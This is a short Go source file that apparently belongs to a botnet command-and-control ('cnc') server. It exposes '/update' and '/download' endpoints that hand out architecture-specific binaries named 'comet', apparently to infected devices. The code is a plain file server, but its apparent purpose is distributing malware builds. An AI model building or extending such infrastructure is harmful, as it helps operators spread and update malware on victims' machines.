package http

import (
	"cnc/lib/utils"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
)

func getVersion(w http.ResponseWriter, r *http.Request) {
	arch := r.URL.Query().Get("arch")
	utils.Debug(fmt.Sprintf("[%s] Fetch lasted build for %s", r.RemoteAddr, arch))

	// version|url|name
	io.WriteString(w, fmt.Sprintf("%s|http://%s:%d/download?arch=%s|comet", utils.Version, utils.ServerIP, utils.HttpApiServerPort, arch))
}

func sendBin(w http.ResponseWriter, r *http.Request) {
	arch := r.URL.Query().Get("arch")

	if arch == "" {
		io.WriteString(w, "Error")
		return
	}

	arch = strings.ReplaceAll(arch, "x86_64", "amd64")
	utils.Debug(fmt.Sprintf("[%s] Download build for %s", r.RemoteAddr, arch))

	utils.Debug(fmt.Sprintf("[%s] Download %s build", r.RemoteAddr, arch))

	fileBytes, err := ioutil.ReadFile(fmt.Sprintf("bin/%s_%s", utils.BinBaseName, arch))
	if err != nil {
		io.WriteString(w, "Error")
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(fileBytes)
	return
}

func ListenHttpServer() {
	http.HandleFunc("/update", getVersion)
	http.HandleFunc("/download", sendBin)

	err := http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", utils.HttpApiServerPort), nil)
	utils.HandleError(err)
}
